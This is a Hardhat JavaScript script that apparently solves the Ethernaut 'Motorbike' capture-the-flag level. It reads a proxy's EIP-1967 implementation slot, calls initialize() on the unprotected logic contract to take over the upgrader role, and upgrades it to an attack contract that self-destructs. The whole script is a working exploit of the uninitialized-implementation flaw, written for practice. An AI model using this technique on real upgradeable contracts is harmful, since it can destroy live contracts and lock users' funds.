// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function createInstance(player) {
    // for local test
    const MotorbikeFactory = await hre.ethers.getContractFactory("MotorbikeFactory");
    bikeFactory = await MotorbikeFactory.deploy();
    await bikeFactory.deployed();

    tx = await bikeFactory.createInstance(player.address, { value: ethers.utils.parseEther("0.001") })
    await tx.wait()
    INSTANCE_ADDRESS = await bikeFactory.lastInstance()
    return [INSTANCE_ADDRESS, bikeFactory];
}

async function main() {

    const [owner, player] = await ethers.getSigners();
    INSTANCE_ADDRESS = '0xA0008c253633AD510d8DBC2ac2a65bE06C0a83ce';

    const Motorbike = await hre.ethers.getContractFactory("Motorbike");
    const Engine = await hre.ethers.getContractFactory("Engine");
    bike = Motorbike.attach(INSTANCE_ADDRESS);
    engine = Engine.attach(INSTANCE_ADDRESS);

    storage = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", "latest");

    logicAddress = `0x${storage.slice(2).slice(24, 64)}`;

    engine = Engine.attach(logicAddress);

    tx = await engine.initialize();
    await tx.wait()

    const EngineHack = await hre.ethers.getContractFactory("EngineAttack");
    engineHack = await EngineHack.deploy()
    await engineHack.deployed()
    console.log(`engineHack ${engineHack.address}`);


    console.log(await engine.upgrader());
    tx = await engine.upgradeToAndCall(engineHack.address, EngineHack.interface.encodeFunctionData('destruct', [owner.address]))
    await tx.wait();
    console.log(await engine.upgrader()); // should throw error
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
